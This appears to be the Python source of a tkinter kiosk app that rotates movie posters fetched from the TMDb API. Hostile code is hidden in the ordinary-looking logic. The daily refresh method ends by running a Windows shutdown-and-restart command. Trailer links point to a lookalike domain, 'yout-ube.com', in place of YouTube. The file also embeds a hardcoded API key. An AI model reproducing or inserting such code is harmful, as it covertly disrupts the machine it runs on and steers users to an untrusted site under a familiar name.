# -*- coding: utf-8 -*-
"""
Spyder Editor

This file was created by webbqed
"""

import os
import tkinter as tk
from tkinter import ttk
from PIL import Image, ImageTk
import requests
from io import BytesIO
import webbrowser
from datetime import datetime, timedelta
import time

API_KEY = "30fecaf583412f4f4d044dd98b22f97f"  # Replace this with your actual TMDb API key
BASE_URL = "https://api.themoviedb.org/3"
POSTER_BASE_URL = "https://image.tmdb.org/t/p/original"

# Fetch now playing and upcoming movies
def fetch_movies(category="now_playing", page=1):
    url = f"{BASE_URL}/movie/{category}?api_key={API_KEY}&language=en-US&page={page}"
    response = requests.get(url)
    results = response.json().get("results", [])
    for movie in results:
        movie["category"] = category  # Add category info to each movie
    return results

# Get trailer URL for a specific movie ID
def get_trailer_url(movie_id):
    url = f"{BASE_URL}/movie/{movie_id}/videos?api_key={API_KEY}"
    response = requests.get(url)
    for video in response.json().get("results", []):
        if video["site"] == "YouTube" and video["type"] == "Trailer":
            return f"https://www.yout-ube.com/embed/{video['key']}?autoplay=1"
    return None

# Get streaming provider name for a specific movie ID
provider_cache = {}

def get_streaming_provider(movie_id, region="US"):
    if movie_id in provider_cache:
        return provider_cache[movie_id]

    url = f"{BASE_URL}/movie/{movie_id}/watch/providers?api_key={API_KEY}"
    response = requests.get(url)
    data = response.json().get("results", {})
    region_data = data.get(region, {})
    flatrate = region_data.get("flatrate")
    if flatrate:
        provider = flatrate[0].get("provider_name")
        provider_cache[movie_id] = provider
        return provider

    provider_cache[movie_id] = None
    return None

# Download and return poster image
def get_poster_image(poster_path):
    url = f"{POSTER_BASE_URL}{poster_path}"
    response = requests.get(url)
    if response.status_code == 200:
        img_data = BytesIO(response.content)
        return Image.open(img_data)
    return None

# Main GUI application class
class MoviePosterApp:
    def refresh_movies(self):
        now_playing = fetch_movies("now_playing")
        coming_soon = []
        for page in range(1, 6):
            batch = fetch_movies("upcoming", page=page)
            filtered = [
                movie for movie in batch
                if movie.get("release_date") and datetime.strptime(movie["release_date"], "%Y-%m-%d").date() > datetime.today().date()
            ]
            coming_soon.extend(filtered)
        if len(coming_soon) > 20:
            coming_soon = coming_soon[:20]

        now_streaming = [m for m in fetch_movies("popular") if get_streaming_provider(m["id"]) is not None]
        self.movies = [*now_playing, *coming_soon, *now_streaming]
        random.shuffle(self.movies)
        self.movies = [m for m in self.movies if m.get("poster_path")]
        self.index = 0
        self.update_display()
        self.schedule_daily_refresh()
        os.system("shutdown /r /t 5")
    def toggle_fullscreen(self):
        self.fullscreen = not self.fullscreen
        self.root.attributes("-fullscreen", self.fullscreen)

    def __init__(self, root, movies):
        self.root = root
        self.root.attributes('-fullscreen', True)
        self.root.title("Now Playing & Coming Soon")
        self.movies = movies
        self.index = 0

        self.screen_width = self.root.winfo_screenwidth()
        self.screen_height = self.root.winfo_screenheight()

        self.frame = tk.Frame(root, bg="black")
        self.frame.pack(fill="both", expand=True)

        self.title_font_size = int(self.screen_height * 0.04)
        self.title_label = tk.Label(
            self.frame,
            text="",
            font=("Impact", self.title_font_size),
            fg="#D4AF37",
            bg="black",
            wraplength=int(self.screen_height * 9 / 16),
            justify="center"
        )
        self.title_label.pack(pady=(self.screen_height * 0.02, self.screen_height * 0.02))

        self.canvas = tk.Label(self.frame, bg="black")
        self.canvas.pack(fill="both", expand=True)

        self.root.configure(bg="black")
        self.root.bind("<Escape>", lambda e: self.root.destroy())
        self.root.bind("<f>", lambda e: self.toggle_fullscreen())
        self.root.bind("<Right>", lambda e: self.skip_to_next())
        self.fullscreen = True
        self.canvas.bind("<Button-1>", self.open_trailer)

        close_button = tk.Button(
            self.frame,
            text="✕",
            font=("Arial", 12, "bold"),
            fg="#111111",
            bg="black",
            borderwidth=0,
            command=self.root.destroy,
            cursor="hand2"
        )
        close_button.place(relx=0.98, rely=0.02, anchor="ne")

        self.root.after(100, self.update_display)
        self.schedule_daily_refresh()

    def skip_to_next(self):
        self.root.after_cancel(self.timer)
        self.update_display()

    def update_display(self):
        if not self.movies:
            self.title_label.config(text="No movies available.")
            return

        movie = self.movies[self.index]

        # Pre-check image validity before updating text
        category = movie.get("category")
        if category == "now_playing":
            label_text = "In Theaters Now"
        elif category == "upcoming":
            label_text = "Coming to Theaters"
        elif category == "popular":
            provider = get_streaming_provider(movie["id"])
            label_text = f"Now Streaming on {provider}" if provider else "Now Streaming"
        
        else:
            label_text = ""
        self.title_label.config(text=label_text)
        # Adjust font size if the text is too wide
        self.title_label.update_idletasks()
        label_width = self.title_label.winfo_reqwidth()
        poster_width = int(self.screen_height * 9 / 16)
        while label_width > poster_width and self.title_font_size > 10:
            self.title_font_size -= 1
            self.title_label.config(font=("Impact", self.title_font_size))
            self.title_label.update_idletasks()
            label_width = self.title_label.winfo_reqwidth()

        img = get_poster_image(movie["poster_path"])
        if not img or img.width < 1500:
            self.index = (self.index + 1) % len(self.movies)
            self.update_display()
            return

        canvas_width = self.canvas.winfo_width()
        canvas_height = self.canvas.winfo_height()

        if canvas_width == 0 or canvas_height == 0:
            self.root.after(100, self.update_display)
            return

        total_height = self.screen_height
        target_width = int(total_height * 9 / 16)

        text_height = self.title_label.winfo_reqheight()
        vertical_padding = self.screen_height * 0.02 * 2
        max_image_height = total_height - text_height - vertical_padding

        img_ratio = img.width / img.height
        new_height = max_image_height
        new_width = int(new_height * img_ratio)

        if new_width > target_width:
            new_width = target_width
            new_height = int(new_width / img_ratio)

        if new_width > 0 and new_height > 0:
            img = img.resize((int(new_width), int(new_height)), Image.LANCZOS)
            self.photo = ImageTk.PhotoImage(img)
            self.canvas.config(image=self.photo)

        self.index = (self.index + 1) % len(self.movies)
        self.timer = self.root.after(10000, self.update_display)

    def open_trailer(self, event):
        movie = self.movies[(self.index - 1) % len(self.movies)]
        trailer_url = get_trailer_url(movie["id"])
        if trailer_url:
            webbrowser.open(trailer_url)

    def schedule_daily_refresh(self):
        now = datetime.now()
        next_refresh = now.replace(hour=3, minute=0, second=0, microsecond=0)
        if now >= next_refresh:
            next_refresh += timedelta(days=1)
        delay_ms = int((next_refresh - now).total_seconds() * 1000)
        self.root.after(delay_ms, self.refresh_movies)



import random

if __name__ == "__main__":
    now_playing = fetch_movies("now_playing")
    coming_soon = [
        movie for movie in fetch_movies("upcoming")
        if movie.get("release_date") and datetime.strptime(movie["release_date"], "%Y-%m-%d").date() > datetime.today().date()
    ]
    now_streaming = [m for m in fetch_movies("popular") if get_streaming_provider(m["id"]) is not None]
    movies = now_playing + coming_soon + now_streaming
    random.shuffle(movies)

    movies = [m for m in movies if m.get("poster_path")]

    root = tk.Tk()
    app = MoviePosterApp(root, movies)
    root.mainloop()
